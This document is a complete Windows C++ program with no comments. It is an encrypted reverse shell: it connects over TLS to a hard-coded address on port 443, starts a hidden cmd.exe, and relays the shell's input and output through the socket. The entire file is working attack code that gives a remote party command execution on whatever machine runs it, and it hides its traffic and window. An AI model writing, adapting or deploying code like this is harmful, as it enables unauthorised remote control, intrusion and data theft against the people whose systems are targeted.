#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <openssl/ssl.h>
#include <openssl/err.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

int main() {

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sockaddr_in server;
    const char* ip = "172.17.25.182";
    u_short port = 443;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server.sin_addr);

    WSAConnect(sock, (sockaddr*)&server, sizeof(server), NULL, NULL, NULL, NULL);

    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    SSL_CTX* context = SSL_CTX_new(TLS_client_method());
    SSL* ssl = SSL_new(context);
    SSL_set_fd(ssl, sock);
    SSL_connect(ssl);

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hReadPipe_in, hWritePipe_in;
    HANDLE hReadPipe_out, hWritePipe_out;
    CreatePipe(&hReadPipe_in, &hWritePipe_in, &sa, 0);
    CreatePipe(&hReadPipe_out, &hWritePipe_out, &sa, 0);

    STARTUPINFOW info = { sizeof(info) };
    PROCESS_INFORMATION pi;
    info.dwFlags = STARTF_USESTDHANDLES;
    info.hStdInput = hReadPipe_in;
    info.hStdOutput = hWritePipe_out;
    info.hStdError = hWritePipe_out;

    wchar_t command[] = L"cmd.exe";
    CreateProcessW(NULL, command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &pi);

    CloseHandle(hReadPipe_in);
    CloseHandle(hWritePipe_out);

    char buffer[4096];
    DWORD pipeBytesAvailable;
    fd_set readfds;
    timeval tv = { 0, 10000 }; 

    while (TRUE) {
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        if (exitCode != STILL_ACTIVE) {
            break;
        }

        if (PeekNamedPipe(hReadPipe_out, NULL, 0, NULL, &pipeBytesAvailable, NULL) && pipeBytesAvailable > 0) {
            DWORD bytesRead;
            ReadFile(hReadPipe_out, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
            if (bytesRead > 0) {
                SSL_write(ssl, buffer, bytesRead);
            }
        }

        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        int selectResult = select(0, &readfds, NULL, NULL, &tv);

        if (selectResult > 0 && FD_ISSET(sock, &readfds)) {
            int sslResult = SSL_read(ssl, buffer, sizeof(buffer) - 1);
            if (sslResult > 0) {
                DWORD bytesWritten;
                WriteFile(hWritePipe_in, buffer, sslResult, &bytesWritten, NULL);
            }
            else {
                break;
            }
        }

        Sleep(1);
    }

    CloseHandle(hWritePipe_in);
    CloseHandle(hReadPipe_out);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(context);
    closesocket(sock);
    WSACleanup();

    return 0;
}